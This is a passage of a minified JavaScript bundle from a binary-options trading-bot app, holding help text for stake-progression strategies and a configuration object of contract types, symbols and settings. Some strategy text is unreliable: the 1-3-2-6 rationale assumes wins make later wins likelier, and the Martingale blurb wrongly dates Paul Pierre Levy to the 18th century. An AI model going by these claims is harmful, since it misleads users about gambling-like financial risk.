                        content: [(0, i.NC)("The table illustrates this principle in the second session. After a trade resulting in loss in round 4 followed by a successful trade in round 5, the stake will increase to 2 USD for round 6. This is in line with the strategy's rule of raising the stake only after a loss is followed by a successful trade.")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("<strong>Principle 3: The stake adjusts to the gap size between current loss and the target profit for the session</strong>")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("In round 7, the stake is adjusted downwards from 2 USD to 1 USD, to meet the target profit of 1 USD.")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("The stake adjustment: target session profit (1 USD) - current session profit (0 USD) = 1 USD")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("The second session concludes upon reaching the aim of one unit of potential profit per session, equivalent to 1 USD. If trading continues, a new session will commence again.")]
                    }, {
                        type: "subtitle",
                        content: [(0, i.NC)("Profit and loss thresholds")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("With Binarytools, traders can set the profit and loss thresholds to secure potential profits and limit potential losses. This means that the trading bot will automatically stop when either the profit or loss threshold is reached. This is a form of risk management that can potentially boost successful trades whilst limiting the impact of loss. For example, if a trader sets the profit threshold at 100 USD and the strategy exceeds 100 USD of profit from all trades, then the bot will stop running.")]
                    }, {
                        type: "subtitle",
                        content: [(0, i.NC)("Summary")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("The Oscar's Grind strategy provides a disciplined approach for incremental gains through systematic stake progression. When integrated into Binarytools with proper risk management like profit or loss thresholds, it offers traders a potentially powerful automated trading technique. However, traders should first thoroughly assess their risk tolerance and first try trading on a demo account in order to familiarise with the strategy before trading with real funds.")]
                    }, {
                        type: "text_italic",
                        content: [(0, i.NC)("<strong>Disclaimer:</strong>")]
                    }, {
                        type: "text_italic",
                        content: [(0, i.NC)("Please be aware that while we may use rounded figures for illustration, a stake of a specific amount does not guarantee an exact amount in successful trades. For example, a 1 USD stake does not necessarily equate to a 1 USD profit in successful trades.")]
                    }, {
                        type: "text_italic",
                        content: [(0, i.NC)("Trading inherently involves risks, and actual profits can fluctuate due to various factors, including market volatility and other unforeseen variables. As such, exercise caution and conduct thorough research before engaging in any trading activities.")]
                    }],
                    r = () => [{
                        type: "subtitle",
                        content: [(0, i.NC)("Exploring the Reverse D’Alembert strategy in Binarytools")],
                        expanded: !0,
                        no_collapsible: !1
                    }, {
                        type: "text",
                        content: [(0, i.NC)("The Reverse D'Alembert strategy involves increasing your stake after a successful trade and reducing it after a losing trade by a predetermined number of units.")]
                    }, {
                        type: "subtitle",
                        content: [(0, i.NC)("Key parameters")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("These are the trade parameters used in Binarytools with Reverse D’Alembert strategy.")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("<strong>Initial stake:</strong> The amount that you are willing to place as a stake to enter a trade. This is the starting point for any changes in stake depending on the dynamic of the strategy being used.")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("<strong>Unit:</strong> The number of units that are added in the event of successful trades or the number of units removed in the event of losing trades. For example, if the unit is set at 2, the stake increases or decreases by two times the initial stake of 1 USD, meaning it changes by 2 USD.")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("<strong>Profit threshold:</strong> The bot will stop trading if your total profit exceeds this amount.")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("<strong>Loss threshold:</strong> The bot will stop trading if your total loss exceeds this amount.")]
                    }, {
                        type: "subtitle",
                        content: [(0, i.NC)("An example of Reverse D’Alembert strategy")]
                    }, {
                        type: "media",
                        src: (0, a.oY)("reverse_dalembert.svg"),
                        alt: (0, i.NC)("An example of Reverse D’Alembert strategy")
                    }, {
                        type: "text",
                        content: [(0, i.NC)("1. Start with the initial stake. Let’s say 1 USD."), (0, i.NC)("2. Select your unit. In this example, it is 2 units or 2 USD."), (0, i.NC)("3. For trades that result in a profit, the stake for the next trade will be increased by 2 USD. Binarytools will continue to add 2 USD for every successful trade. See A1."), (0, i.NC)("4. For trades that result in a loss, there are two outcomes.  If it was traded at the initial stake, the next trade will remain at the same amount as the strategy trades minimally at the initial stake, see A2. If it was traded with a higher amount, the stake for the next trade would be reduced by 2 USD, see A3.")]
                    }, {
                        type: "subtitle",
                        content: [(0, i.NC)("Profit and loss thresholds")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("With Binarytools, traders can set the profit and loss thresholds to secure potential profits and limit potential losses. This means that the trading bot will automatically stop when either the profit or loss threshold is reached. This is a form of risk management that can potentially boost successful trades whilst limiting the impact of loss. For example, if a trader sets the profit threshold at 100 USD and the strategy exceeds 100 USD of profit from all trades, then the bot will stop running.")]
                    }, {
                        type: "subtitle",
                        content: [(0, i.NC)("Summary")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("Effective trading with the D'Alembert system requires careful consideration of its stake progression and risk management. Traders can automate this approach using Binarytools, setting profit and loss thresholds to ensure balanced and controlled trading. However, it is crucial for traders to assess their risk appetite, test strategies on a demo account, and align with their own trading style before transitioning to real money trading. This optimization process helps strike a balance between potential gains and losses while managing risk prudently.")]
                    }, {
                        type: "text_italic",
                        content: [(0, i.NC)("<strong>Disclaimer:</strong>")]
                    }, {
                        type: "text_italic",
                        content: [(0, i.NC)("Please be aware that while we may use rounded figures for illustration, a stake of a specific amount does not guarantee an exact amount in successful trades. For example, a 1 USD stake does not necessarily equate to a 1 USD  profit in successful trades.")]
                    }, {
                        type: "text_italic",
                        content: [(0, i.NC)("Trading inherently involves risks, and actual profits can fluctuate due to various factors, including market volatility and other unforeseen variables. As such, exercise caution and conduct thorough research before engaging in any trading activities.")]
                    }],
                    d = () => [{
                        type: "subtitle",
                        content: [(0, i.NC)("Exploring the Reverse Martingale strategy in Binarytools")],
                        expanded: !0,
                        no_collapsible: !1
                    }, {
                        type: "text",
                        content: [(0, i.NC)("The Reverse Martingale strategy involves increasing your stake after each successful trade and resets to the initial stake for every losing trade as it aims to secure potential profits from consecutive wins."), (0, i.NC)("This article explores the Reverse Martingale strategy integrated into Binarytools, a versatile trading bot designed to trade assets such as forex, commodities, and derived indices. We will delve into the strategy's core parameters, its application, and provide essential takeaways for traders looking to use the bot effectively.")]
                    }, {
                        type: "subtitle",
                        content: [(0, i.NC)("Key parameters")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("These are the trade parameters used in Binarytools with Reverse Martingale strategy.")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("<strong>Initial stake:</strong> The amount that you are willing to place as a stake to enter a trade. This is the starting point for any changes in stake depending on the dynamic of the strategy being used.")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("<strong>Multiplier:</strong> The multiplier used to increase your stake if your trade is successful. The value must be greater than 1.")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("<strong>Profit threshold:</strong> The bot will stop trading if your total profit exceeds this amount.")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("<strong>Loss threshold:</strong> The bot will stop trading if your total loss exceeds this amount.")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("<strong>Maximum stake:</strong> The maximum amount you are willing to pay to enter a single trade. The stake for your next trade will reset to the initial stake if it exceeds this value. This is an optional risk management parameter.")]
                    }, {
                        type: "subtitle",
                        content: [(0, i.NC)("An example of Reverse Martingale strategy")]
                    }, {
                        type: "media",
                        src: (0, a.oY)("reverse_martingale.svg"),
                        alt: (0, i.NC)("An example of Martingale strategy")
                    }, {
                        type: "text",
                        content: [(0, i.NC)("1. Start with the initial stake. Let’s say 1 USD."), (0, i.NC)("2. Select your Martingale multiplier. In this example, it is 2."), (0, i.NC)("3. If the first trade is a successful trade, Binarytools will automatically double your stake for the next trade to 2 USD. Binarytools will continue to double the stake after every successful trade."), (0, i.NC)("4. If a trade ends in a loss, the stake for the following trade will be reset to the initial stake amount of 1 USD.")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("The objective of Martingale strategy is to take advantage of consecutive successful trades and maximise potential profits from them. This strategy is beneficial only if there are consecutive successful trades. Therefore, it is important to set a maximum stake to secure all the potential profits gained from a number of consecutive successful trades, or you could lose all the profits you have accumulated, including your initial stake. For example, if your goal is to maximise profits within 2 consecutive successful trades, you set a maximum stake of 2 USD, given your initial stake is 1 USD. Similarly, if your goal is to maximise profits within 3 consecutive successful trades, you set a maximum stake of 4 USD, given your initial stake is 1 USD.")]
                    }, {
                        type: "subtitle",
                        content: [(0, i.NC)("Profit and loss thresholds")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("With Binarytools, traders can set the profit and loss thresholds to secure potential profits and limit potential losses. This means that the trading bot will automatically stop when either the profit or loss threshold is reached. This is a form of risk management that can potentially boost successful trades whilst limiting the impact of loss. For example, if a trader sets the profit threshold at 100 USD and the strategy exceeds 100 USD of profit from all trades, then the bot will stop running.")]
                    }, {
                        type: "subtitle",
                        content: [(0, i.NC)("Summary")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("The Reverse Martingale strategy in trading may offer substantial gains but also comes with significant risks. With your selected strategy, Binarytools provides automated trading with risk management measures like setting initial stake, stake size, maximum stake, profit threshold and loss threshold. It's crucial for traders to assess their risk tolerance, practice in a demo account, and understand the strategy before trading with real money.")]
                    }, {
                        type: "text_italic",
                        content: [(0, i.NC)("<strong>Disclaimer:</strong>")]
                    }, {
                        type: "text_italic",
                        content: [(0, i.NC)("Please be aware that while we may use rounded figures for illustration, a stake of a specific amount does not guarantee an exact amount in successful trades. For example, a 1 USD stake does not necessarily equate to a 1 USD profit in successful trades.")]
                    }, {
                        type: "text_italic",
                        content: [(0, i.NC)("Trading inherently involves risks, and actual profits can fluctuate due to various factors, including market volatility and other unforeseen variables. As such, exercise caution and conduct thorough research before engaging in any trading activities.")]
                    }],
                    c = () => [{
                        type: "subtitle",
                        content: [(0, i.NC)("Exploring the 1-3-2-6 strategy in Binarytools")],
                        expanded: !0,
                        no_collapsible: !1
                    }, {
                        type: "text",
                        content: [(0, i.NC)("The 1-3-2-6 strategy aims to maximise potential profits with four consecutive successful trades. One unit is equal to the amount of the initial stake. The stake will adjust from 1 unit to 3 units after the first successful trade, then to 2 units after your second successful trade, and to 6 units after the third successful trade. The stake for the next trade will reset to the initial stake if there is a losing trade or a completion of the trade cycle."), (0, i.NC)("This article explores the strategy integrated into Binarytools, a versatile trading bot designed to trade assets such as Forex, Commodities, and Derived Indices. We will delve into the strategy's core parameters, its application, and provide essential takeaways for traders looking to use the bot effectively.")]
                    }, {
                        type: "subtitle",
                        content: [(0, i.NC)("Key parameters")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("These are the trade parameters used in Binarytools with 1-3-2-6 strategy.")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("<strong>Initial stake:</strong> The amount that you are willing to place as a stake to enter a trade. This is the starting point for any changes in stake depending on the dynamic of the strategy being used.")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("<strong>Profit threshold:</strong> The bot will stop trading if your total profit exceeds this amount.")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("<strong>Loss threshold:</strong> The bot will stop trading if your total loss exceeds this amount.")]
                    }, {
                        type: "subtitle",
                        content: [(0, i.NC)("An example of 1-3-2-6 strategy")]
                    }, {
                        type: "media",
                        src: (0, a.oY)("1-3-2-6.svg"),
                        alt: (0, i.NC)("An example of 1-3-2-6 strategy")
                    }, {
                        type: "text",
                        content: [(0, i.NC)("1. Start with the initial stake. Let’s say 1 USD."), (0, i.NC)("2. If the trade is successful, this strategy will automatically adjust your stake to 3 units of your initial stake for the next trade. In this case, the stake adjustment is 3 units and the initial stake is 1 USD, hence the next trade will start at 3 USD."), (0, i.NC)("3. If the second trade is also successful, your stake will adjust to 2 USD or 2 units of the initial stake for the next trade."), (0, i.NC)("4. However, if any trade results in a loss, your stake will reset back to the initial stake of 1 USD for the next trade. The third trade results in a loss hence the stake resets to the initial stake of 1 USD for the next trade."), (0, i.NC)("5. Upon reaching the initial stake, if the next trade still results in a loss, your stake will remain at the initial stake of 1 USD. This strategy will minimally trade at the initial stake. Refer to the fourth and fifth trade."), (0, i.NC)("6. If consecutive successful trades were to happen, the stake would follow a sequence of adjustment from 1 to 3, then 2, and 6 units of initial stake. After 4 consecutive successful trades, it completes one cycle and then the strategy will repeat itself for another cycle. If any trade results in a loss, your stake will reset back to the initial stake for the next trade.")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("The 1-3-2-6 strategy is designed to capitalise on consecutive successful trades while minimising losses during losing streaks. The rationale behind this strategy lies in statistical probabilities, with adjustments to stake sizes based on the perceived likelihood of success. There is a higher likelihood of success in the second trade after one successful trade. Hence the stake adjusts to 3 in the second trade. In the third trade, the stake adjusts to 2 units due to a lower probability of a successful trade. If the third trade is also successful, the strategy then allocates all the previous gains (a total of 6 units of initial stake) into the fourth trade with the aim of doubling the potential profits. If the fourth trade results in a positive outcome, the strategy helps achieve a total gain of 12 units. However, it is crucial to exercise caution, as the risk can escalate quickly with this strategy, and any loss in the fourth trade forfeits all previous gains.")]
                    }, {
                        type: "subtitle",
                        content: [(0, i.NC)("Profit and loss thresholds")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("With Binarytools, traders can set the profit and loss thresholds to secure potential profits and limit potential losses. This means that the trading bot will automatically stop when either the profit or loss threshold is reached. This is a form of risk management that can potentially boost successful trades whilst limiting the impact of loss. For example, if a trader sets the profit threshold at 100 USD and the strategy exceeds 100 USD of profit from all trades, then the bot will stop running.")]
                    }, {
                        type: "subtitle",
                        content: [(0, i.NC)("Summary")]
                    }, {
                        type: "text",
                        content: [(0, i.NC)("The 1-3-2-6 strategy in trading may offer substantial gains but also comes with significant risks. Each stake is independent, and the strategy does not increase your chances of successful trades in the long run. If you encounter a series of losses, the strategy can lead to significant losses. Therefore, it is crucial for traders to assess their risk tolerance, practice in a demo account, utilise profit and loss thresholds, and fully comprehend the strategy before engaging in real-money trading.")]
                    }, {
                        type: "text_italic",
                        content: [(0, i.NC)("<strong>Disclaimer:</strong>")]
                    }, {
                        type: "text_italic",
                        content: [(0, i.NC)("Please be aware that while we may use rounded figures for illustration, a stake of a specific amount does not guarantee an exact amount in successful trades. For example, a 1 USD stake does not necessarily equate to a 1 USD profit in successful trades."), (0, i.NC)("Trading inherently involves risks, and actual profits can fluctuate due to various factors, including market volatility and other unforeseen variables. As such, exercise caution and conduct thorough research before engaging in any trading activities.")]
                    }]
            },
            33690: function(e, t, n) {
                "use strict";
                n.d(t, {
                    i: function() {
                        return a
                    }
                });
                let a = Object.freeze({
                    CONTRACT: "contract",
                    DIVIDER: "divider"
                })
            },
            47962: function(e, t, n) {
                "use strict";
                n.d(t, {
                    GL: function() {
                        return o
                    },
                    I_: function() {
                        return l
                    },
                    vc: function() {
                        return s
                    }
                });
                var a = n(48059);
                let i = ["BTC", "ETH", "LTC", "BCH", "UST"],
                    l = () => {
                        o.vh_variables.vh_official = !1, o.vh_variables.max_steps = 1, o.vh_variables.is_enabled = !1, o.vh_variables.current_step = 1, o.vh_variables.current_trades_real = 0, o.vh_variables.is_martingale_active = !1, o.vh_variables.mart_total_lost = 0, o.vh_variables.allow_martingale = !1
                    },
                    o = {
                        show_notifications: {
                            show_tp: !1,
                            show_sl: !1
                        },
                        other_symbol: {
                            isActive: !1,
                            symbol: ""
                        },
                        pred_setter: {
                            prediction: "0",
                            allow_pred_setter: !1
                        },
                        contract_switcher: {
                            contract_switcher_value: "disable"
                        },
                        custom_variables: {
                            isApolloBots: !1
                        },
                        copy_trading: {
                            is_active: !1
                        },
                        demo_copy_trading: {
                            is_active: !1,
                            login_id: ""
                        },
                        vh_variables: {
                            vh_official: !1,
                            martingale: 1,
                            token: "",
                            max_steps: 1,
                            min_trades: 1,
                            take_profit: 8,
                            stop_loss: 20,
                            is_authorized: !1,
                            is_enabled: !1,
                            stake: .35,
                            current_step: 1,
                            current_trades_real: 0,
                            is_martingale_active: !1,
                            mart_total_lost: 0,
                            allow_martingale: !1,
                            mart_stake: 0,
                            total_loss: 0,
                            enable_total_lost: !1
                        },
                        analysis_vars: {
                            tick_list: [],
                            sub_id: "",
                            last_digit: 0,
                            current_tick: "...",
                            symbol_list: [],
                            subscribed: !1
                        },
                        touch_notouch_vars: {
                            barrier_offset: 0,
                            barrier_offset_active: !1,
                            official_offseter: !1
                        },
                        lists: {
                            PAYOUTTYPE: [
                                [(0, a.NC)("Stake"), "stake"]
                            ],
                            CRYPTO_CURRENCIES: i,
                            DETAILS: [
                                [(0, a.NC)("deal reference id"), "1"],
                                [(0, a.NC)("purchase price"), "2"],
                                [(0, a.NC)("payout"), "3"],
                                [(0, a.NC)("profit"), "4"],
                                [(0, a.NC)("contract type"), "5"],
                                [(0, a.NC)("entry spot time"), "6"],
                                [(0, a.NC)("entry spot price"), "7"],
                                [(0, a.NC)("exit spot time"), "8"],
                                [(0, a.NC)("exit spot price"), "9"],
                                [(0, a.NC)("barrier"), "10"],
                                [(0, a.NC)("result"), "11"]
                            ],
                            CHECK_RESULT: [
                                [(0, a.NC)("Win"), "win"],
                                [(0, a.NC)("Loss"), "loss"]
                            ],
                            CHECK_DIRECTION: [
                                [(0, a.NC)("Rise"), "rise"],
                                [(0, a.NC)("Fall"), "fall"],
                                [(0, a.NC)("No Change"), ""]
                            ],
                            BALANCE_TYPE: [
                                [(0, a.NC)("string"), "STR"],
                                [(0, a.NC)("number"), "NUM"]
                            ],
                            NOTIFICATION_TYPE: [
                                [(0, a.NC)("green"), "success"],
                                [(0, a.NC)("blue"), "info"],
                                [(0, a.NC)("yellow"), "warn"],
                                [(0, a.NC)("red"), "error"]
                            ],
                            BARRIER_OFFSETER_STATUS: [
                                [(0, a.NC)("disable"), "disable"],
                                [(0, a.NC)("enable"), "enable"]
                            ],
                            OTHER_CONTRACTS_TYPES: [
                                [(0, a.NC)("disable"), "disable"],
                                [(0, a.NC)("Volatility 10 (1s) index"), "1HZ10V"],
                                [(0, a.NC)("Volatility 10 index"), "R_10"],
                                [(0, a.NC)("Volatility 25 (1s) index"), "1HZ25V"],
                                [(0, a.NC)("Volatility 25 index"), "R_25"],
                                [(0, a.NC)("Volatility 50 (1s) index"), "1HZ50V"],
                                [(0, a.NC)("Volatility 50 index"), "R_50"],
                                [(0, a.NC)("Volatility 75 (1s) index"), "1HZ75V"],
                                [(0, a.NC)("Volatility 75 index"), "R_75"],
                                [(0, a.NC)("Volatility 100 (1s) index"), "1HZ100V"],
                                [(0, a.NC)("Volatility 100 index"), "R_100"]
                            ],
                            DEMO_COPIER_STATUS: [
                                [(0, a.NC)("disable"), "disable"],
                                [(0, a.NC)("enable"), "enable"]
                            ],
                            PREDICTION_ITEMS: [
                                ["0", "0"],
                                ["1", "1"],
                                ["2", "2"],
                                ["3", "3"],
                                ["4", "4"],
                                ["5", "5"],
                                ["6", "6"],
                                ["7", "7"],
                                ["8", "8"],
                                ["9", "9"]
                            ],
                            NOTIFICATION_SOUND: [
                                [(0, a.NC)("Silent"), "silent"],
                                [(0, a.NC)("Announcement"), "announcement"],
                                [(0, a.NC)("Earned money"), "earned-money"],
                                [(0, a.NC)("Job done"), "job-done"],
                                [(0, a.NC)("Error"), "error"],
                                [(0, a.NC)("Severe error"), "severe-error"]
                            ],
                            CURRENCY: ["USD", "EUR", "GBP", "AUD", ...i]
                        },
                        opposites: {
                            ACCUMULATOR: [{
                                ACCU: (0, a.NC)("Buy")
                            }],
                            MULTIPLIER: [{
                                MULTUP: (0, a.NC)("Up")
                            }, {
                                MULTDOWN: (0, a.NC)("Down")
                            }],
                            CALLPUT: [{
                                CALL: (0, a.NC)("Rise")
                            }, {
                                PUT: (0, a.NC)("Fall")
                            }],
                            CALLPUTEQUAL: [{
                                CALLE: (0, a.NC)("Rise Equals")
                            }, {
                                PUTE: (0, a.NC)("Fall Equals")
                            }],
                            HIGHERLOWER: [{
                                CALL: (0, a.NC)("Higher")
                            }, {
                                PUT: (0, a.NC)("Lower")
                            }],
                            TOUCHNOTOUCH: [{
                                ONETOUCH: (0, a.NC)("Touch")
                            }, {
                                NOTOUCH: (0, a.NC)("No Touch")
                            }],
                            ENDSINOUT: [{
                                EXPIRYRANGE: (0, a.NC)("Ends Between")
                            }, {
                                EXPIRYMISS: (0, a.NC)("Ends Outside")
                            }],
                            STAYSINOUT: [{
                                RANGE: (0, a.NC)("Stays Between")
                            }, {
                                UPORDOWN: (0, a.NC)("Goes Outside")
                            }],
                            ASIANS: [{
                                ASIANU: (0, a.NC)("Asian Up")
                            }, {
                                ASIAND: (0, a.NC)("Asian Down")
                            }],
                            MATCHESDIFFERS: [{
                                DIGITMATCH: (0, a.NC)("Matches")
                            }, {
                                DIGITDIFF: (0, a.NC)("Differs")
                            }],
                            EVENODD: [{
                                DIGITEVEN: (0, a.NC)("Even")
                            }, {
                                DIGITODD: (0, a.NC)("Odd")
                            }],
                            OVERUNDER: [{
                                DIGITOVER: (0, a.NC)("Over")
                            }, {
                                DIGITUNDER: (0, a.NC)("Under")
                            }],
                            HIGHLOWTICKS: [{
                                TICKHIGH: (0, a.NC)("High Tick")
                            }, {
                                TICKLOW: (0, a.NC)("Low Tick")
                            }],
                            RESET: [{
                                RESETCALL: (0, a.NC)("Reset Call")
                            }, {
                                RESETPUT: (0, a.NC)("Reset Put")
                            }],
                            RUNS: [{
                                RUNHIGH: (0, a.NC)("Only Ups")
                            }, {
                                RUNLOW: (0, a.NC)("Only Downs")
                            }],
                            CALLPUTSPREAD: [{
                                CALLSPREAD: (0, a.NC)("Call Spread")
                            }, {
                                PUTSPREAD: (0, a.NC)("Put Spread")
                            }]
                        },
                        BARRIER_TYPES: [
                            ["Offset +", "+"],
                            ["Offset -", "-"]
                        ],
                        ohlcFields: [
                            [(0, a.NC)("Open"), "open"],
                            [(0, a.NC)("High"), "high"],
                            [(0, a.NC)("Low"), "low"],
                            [(0, a.NC)("Close"), "close"],
                            [(0, a.NC)("Open Time"), "epoch"]
                        ],
                        candleIntervals: [
                            [(0, a.NC)("Default"), "default"],
                            [(0, a.NC)("1 minute"), "60"],
                            [(0, a.NC)("2 minutes"), "120"],
                            [(0, a.NC)("3 minutes"), "180"],
                            [(0, a.NC)("5 minutes"), "300"],
                            [(0, a.NC)("10 minutes"), "600"],
                            [(0, a.NC)("15 minutes"), "900"],
                            [(0, a.NC)("30 minutes"), "1800"],
                            [(0, a.NC)("1 hour"), "3600"],
                            [(0, a.NC)("2 hours"), "7200"],
                            [(0, a.NC)("4 hours"), "14400"],
                            [(0, a.NC)("8 hours"), "28800"],
                            [(0, a.NC)("1 day"), "86400"]
                        ],
                        mainBlocks: ["trade_definition", "before_purchase", "during_purchase", "after_purchase"],
                        mandatoryMainBlocks: ["trade_definition", "apollo_purchase", "before_purchase"],
                        procedureDefinitionBlocks: ["procedures_defnoreturn", "procedures_defreturn"],
                        single_instance_blocks: ["trade_definition", "before_purchase", "during_purchase", "after_purchase"],
                        TRADE_TYPE_TO_CONTRACT_CATEGORY_MAPPING: {
                            callput: ["callput", "higherlower"],
                            asian: ["asians"],
                            digits: ["matchesdiffers", "evenodd", "overunder"]
                        },
                        TRADE_TYPE_CATEGORIES: {
                            multiplier: ["multiplier"],
                            callput: ["callput", "callputequal", "higherlower"],
                            touchnotouch: ["touchnotouch"],
                            inout: ["endsinout", "staysinout"],
                            asian: ["asians"],
                            digits: ["matchesdiffers", "evenodd", "overunder"],
                            reset: ["reset"],
                            callputspread: ["callputspread"],
                            highlowticks: ["highlowticks"],
                            runs: ["runs"],
                            accumulator: ["accumulator"]
                        },
                        TRADE_TYPE_CATEGORY_NAMES: {
                            callput: (0, a.NC)("Up/Down"),
                            touchnotouch: (0, a.NC)("Touch/No Touch"),
                            inout: (0, a.NC)("In/Out"),
                            asian: (0, a.NC)("Asians"),
                            digits: (0, a.NC)("Digits"),
                            reset: (0, a.NC)("Reset Call/Reset Put"),
                            callputspread: (0, a.NC)("Call Spread/Put Spread"),
                            highlowticks: (0, a.NC)("High/Low Ticks"),
                            runs: (0, a.NC)("Only Ups/Only Downs"),
                            multiplier: (0, a.NC)("Multipliers"),
                            accumulator: (0, a.NC)("Accumulators")
                        },
                        BARRIER_CATEGORIES: {
                            euro_atm: ["callput", "callputequal"],
                            euro_non_atm: ["endsinout", "higherlower", "callputspread"],
                            american: ["staysinout", "touchnotouch", "highlowticks", "runs", "multiplier"],
                            non_financial: ["digits", "overunder", "evenodd", "matchesdiffers"],
                            asian: ["asians"],
                            reset: ["reset"],
                            lookback: ["lookback"],
                            accumulator: ["accumulator"]
                        },
                        DEFAULT_DURATION_DROPDOWN_OPTIONS: [
                            [(0, a.NC)("Ticks"), "t"],
                            [(0, a.NC)("Seconds"), "s"],
                            [(0, a.NC)("Minutes"), "m"],
                            [(0, a.NC)("Hours"), "h"],
                            [(0, a.NC)("Days"), "d"]
                        ],
                        BARRIER_LABELS: [(0, a.NC)("High barrier"), (0, a.NC)("Low barrier")],
                        ABSOLUTE_BARRIER_DROPDOWN_OPTION: [
                            [(0, a.NC)("Absolute"), "absolute"]
                        ],
                        NOT_AVAILABLE_DROPDOWN_OPTIONS: [
                            [(0, a.NC)("Not available"), "na"]
                        ],
                        NOT_AVAILABLE_DURATIONS: [{
                            display: (0, a.NC)("Not available"),
                            unit: "na",
                            min: 0
                        }],
                        BARRIER_TRADE_TYPES: ["higherlower", "touchnotouch", "endsinout", "staysinout", "callputspread"],
                        PREDICTION_TRADE_TYPES: ["matchesdiffers", "overunder", "highlowticks"],
                        DIGIT_CATEGORIES: ["digits", "highlowticks"],
                        INDEPEDENT_BLOCKS: ["block_holder", "tick_analysis", "loader", "procedures_defreturn", "procedures_defnoreturn"],
                        bbResult: [
                            [(0, a.NC)("upper"), "1"],
                            [(0, a.NC)("middle"), "0"],
                            [(0, a.NC)("lower"), "2"]
                        ],
                        macdFields: [
                            [(0, a.NC)("Histogram"), "0"],
                            [(0, a.NC)("MACD"), "1"],
                            [(0, a.NC)("Signal"), "2"]
                        ],
                        gd: {
                            scope: "https://www.googleapis.com/auth/drive.file",
                            discovery_docs: "https://www.googleapis.com/discovery/v1/apis/drive/v3/rest"
                        },
                        workspaces: {
                            flyoutWorkspacesStartScale: .7,
                            mainWorkspaceStartScale: .9,
                            previewWorkspaceStartScale: .6,
                            indentWorkspace: {
                                x: 0,
                                y: 60
                            }
                        },
                        strategies: {
                            martingale: {
                                index: 0,
                                label: (0, a.NC)("Martingale"),
                                description: (0, a.NC)("The Martingale Strategy is a classic trading technique that has been used for more than a hundred years, popularised by the French mathematician Paul Pierre Levy in the 18th century.")
                            },
                            dalembert: {
                                index: 1,
                                label: (0, a.NC)("D'Alembert"),
                                description: (0, a.NC)("The concept of the D’Alembert Strategy is said to be similar to the Martingale Strategy where you will increase your contract size after a loss. With the D’Alembert Strategy, you will also decrease your contract size after a successful trade.")
                            },
                            oscars_grind: {
                                index: 2,
                                label: (0, a.NC)("Oscar's Grind"),
                                description: (0, a.NC)("The Oscar's Grind Strategy is a low-risk positive progression strategy that first appeared in 1965. By using this strategy, the size of your contract will increase after successful trades, but remains unchanged after unsuccessful trades.")
                            }
                        },
                        default_file_name: (0, a.NC)("Untitled Bot"),
                        DISABLED_SYMBOLS: ["frxGBPNOK", "frxUSDNOK", "frxUSDNEK", "frxUSDSEK"],
                        DISABLED_SUBMARKETS: ["energy"],
                        QUICK_STRATEGY: {
                            DISABLED: {
                                SYMBOLS: ["1HZ150V", "1HZ250V"],
                                SUBMARKETS: ["crash_index", "non_stable_coin", "step_index"],
                                BARRIER_TRADE_TYPES: ["higherlower", "touchnotouch", "endsinout", "staysinout", "callputspread", "accumulator"],
                                PREDICTION_TRADE_TYPES: ["highlowticks"]
                            },
                            DEFAULT: {
                                symbol: "1HZ100V",
                                tradetype: "callput",
                                durationtype: "t",
                                size: 1,
                                unit: 1,
                                prediction: 0
                            }
                        }
                    },
                    s = () => ({
                        lists: {
                            PAYOUTTYPE: [
                                [(0, a.NC)("Stake"), "stake"]
                            ],
                            CRYPTO_CURRENCIES: i,
                            DETAILS: [
                                [(0, a.NC)("deal reference id"), "1"],
                                [(0, a.NC)("purchase price"), "2"],
                                [(0, a.NC)("payout"), "3"],
                                [(0, a.NC)("profit"), "4"],
                                [(0, a.NC)("contract type"), "5"],
                                [(0, a.NC)("entry spot time"), "6"],
                                [(0, a.NC)("entry spot price"), "7"],
                                [(0, a.NC)("exit spot time"), "8"],
                                [(0, a.NC)("exit spot price"), "9"],
                                [(0, a.NC)("barrier"), "10"],
                                [(0, a.NC)("result"), "11"]
                            ],
                            CHECK_RESULT: [
                                [(0, a.NC)("Win"), "win"],
                                [(0, a.NC)("Loss"), "loss"]
                            ],
                            CHECK_DIRECTION: [
                                [(0, a.NC)("Rise"), "rise"],
                                [(0, a.NC)("Fall"), "fall"],
                                [(0, a.NC)("No Change"), ""]
                            ],
                            BALANCE_TYPE: [
                                [(0, a.NC)("string"), "STR"],
                                [(0, a.NC)("number"), "NUM"]
                            ],
                            NOTIFICATION_TYPE: [
                                [(0, a.NC)("green"), "success"],
                                [(0, a.NC)("blue"), "info"],
                                [(0, a.NC)("yellow"), "warn"],
                                [(0, a.NC)("red"), "error"]
                            ],
                            NOTIFICATION_SOUND: [
                                [(0, a.NC)("Silent"), "silent"],
                                [(0, a.NC)("Announcement"), "announcement"],
                                [(0, a.NC)("Earned money"), "earned-money"],
                                [(0, a.NC)("Job done"), "job-done"],
                                [(0, a.NC)("Error"), "error"],
                                [(0, a.NC)("Severe error"), "severe-error"]
                            ],
                            CURRENCY: ["USD", "EUR", "GBP", "AUD", ...i],
                            BARRIER_OFFSETER_STATUS: [
                                [(0, a.NC)("disable"), "disable"],
                                [(0, a.NC)("enable"), "enable"]
                            ],
                            PREDICTION_ITEMS: [
                                ["0", "0"],
                                ["1", "1"],
                                ["2", "2"],
                                ["3", "3"],
